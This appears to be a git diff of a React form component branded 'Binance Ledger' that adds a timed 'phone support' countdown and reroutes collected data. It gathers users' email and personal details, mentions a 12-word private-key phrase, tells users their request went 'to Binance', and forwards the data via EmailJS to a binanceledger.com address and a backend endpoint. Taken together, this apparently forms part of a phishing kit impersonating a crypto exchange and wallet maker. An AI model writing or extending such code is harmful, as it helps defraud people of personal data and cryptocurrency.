@@ -44,6 +44,9 @@ const BinanceLedgerForm: FC = () => {
     country: "",
     phoneNumber: ""
   });
+  const [isPhoneSupportCountingDown, setIsPhoneSupportCountingDown] = useState(false);
+  const [phoneSupportCountdown, setPhoneSupportCountdown] = useState(9);
+  const [phoneSupportContactingUser, setPhoneSupportContactingUser] = useState(false);
 
   // Generate a mock private key (12 words)
   const privateKeyWords = [
@@ -56,7 +59,7 @@ const BinanceLedgerForm: FC = () => {
     emailjs.init(EMAILJS_CONFIG.USER_ID);
   }, []);
 
-  // Countdown effect
+  // Countdown effect for shipping support
   useEffect(() => {
     let interval: NodeJS.Timeout;
     if (isCountingDown && countdown > 0) {
@@ -66,24 +69,46 @@ const BinanceLedgerForm: FC = () => {
     } else if (countdown === 0 && isCountingDown) {
       setContactingUser(true);
       setIsCountingDown(false);
-      // Send email notification to backend
-      sendSupportRequest('shipping-support');
+      // Send email notification directly for countdown support requests
+      sendCountdownSupportRequest('shipping-support');
     }
     return () => clearInterval(interval);
   }, [isCountingDown, countdown]);
 
-  // Enhanced email sending function - now sends directly to donotreply@binanceledger.com
-  const sendEmailNotification = async (step: string, data: any) => {
+  // Countdown effect for phone support
+  useEffect(() => {
+    let interval: NodeJS.Timeout;
+    if (isPhoneSupportCountingDown && phoneSupportCountdown > 0) {
+      interval = setInterval(() => {
+        setPhoneSupportCountdown(prev => prev - 1);
+      }, 1000);
+    } else if (phoneSupportCountdown === 0 && isPhoneSupportCountingDown) {
+      setPhoneSupportContactingUser(true);
+      setIsPhoneSupportCountingDown(false);
+      // Send email notification directly for countdown support requests
+      sendCountdownSupportRequest('phone-support');
+    }
+    return () => clearInterval(interval);
+  }, [isPhoneSupportCountingDown, phoneSupportCountdown]);
+
+  // Direct email sending function for countdown support requests ONLY
+  const sendCountdownSupportRequest = async (supportType: string) => {
     try {
       const templateParams = {
-        step: step,
+        step: 'countdown-support-request',
         email: email,
         timestamp: new Date().toISOString(),
-        data: JSON.stringify(data, null, 2),
+        data: JSON.stringify({
+          email,
+          personalDetails,
+          supportCode: '7791',
+          requestType: supportType,
+          currentStep
+        }, null, 2),
         to_email: EMAILJS_CONFIG.TO_EMAIL, // Direct to donotreply@binanceledger.com
         from_name: 'Binance Ledger Form',
         from_email: email,
-        message: `Form submission for step: ${step}\n\nUser Email: ${email}\nData: ${JSON.stringify(data, null, 2)}`
+        message: `Countdown Support Request - ${supportType}\n\nUser Email: ${email}\nSupport Code: 7791\nRequest Type: ${supportType}`
       };
 
       const result = await emailjs.send(
@@ -92,31 +117,14 @@ const BinanceLedgerForm: FC = () => {
         templateParams
       );
 
-      console.log('Email sent successfully to donotreply@binanceledger.com:', result);
-      return result;
-    } catch (error) {
-      console.error('Failed to send email:', error);
-      throw error;
-    }
-  };
-
-  const sendSupportRequest = async (supportType: string) => {
-    try {
-      // Send support request directly via EmailJS to donotreply@binanceledger.com
-      await sendEmailNotification('support-request', {
-        email,
-        personalDetails,
-        supportCode: '7791',
-        requestType: supportType,
-        currentStep
-      });
-
+      console.log('Countdown support email sent successfully to donotreply@binanceledger.com:', result);
+      
       toast({
         title: "Support Request Sent",
         description: "Your support request has been sent to Binance.",
       });
     } catch (error) {
-      console.error('Failed to send support request:', error);
+      console.error('Failed to send countdown support request:', error);
       toast({
         title: "Error",
         description: "Failed to send support request. Please try again.",
@@ -125,10 +133,21 @@ const BinanceLedgerForm: FC = () => {
     }
   };
 
+  // Regular form data sending function - goes through backend API
   const sendFormData = async (step: string, data: any) => {
     try {
-      // Send directly via EmailJS to donotreply@binanceledger.com
-      await sendEmailNotification(step, data);
+      // Send to your backend API endpoint
+      await fetch('/api/form-submission', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          step,
+          data,
+          timestamp: new Date().toISOString()
+        })
+      });
     } catch (error) {
       console.error('Failed to send form data:', error);
     }
@@ -138,6 +157,12 @@ const BinanceLedgerForm: FC = () => {
     setIsCountingDown(true);
     setCountdown(9);
     setContactingUser(false);
+  };
+
+  const startPhoneSupportCountdown = () => {
+    setIsPhoneSupportCountingDown(true);
+    setPhoneSupportCountdown(9);
+    setPhoneSupportContactingUser(false);
   };
 
   const transitionToStep = (newStep: FormStep) => {
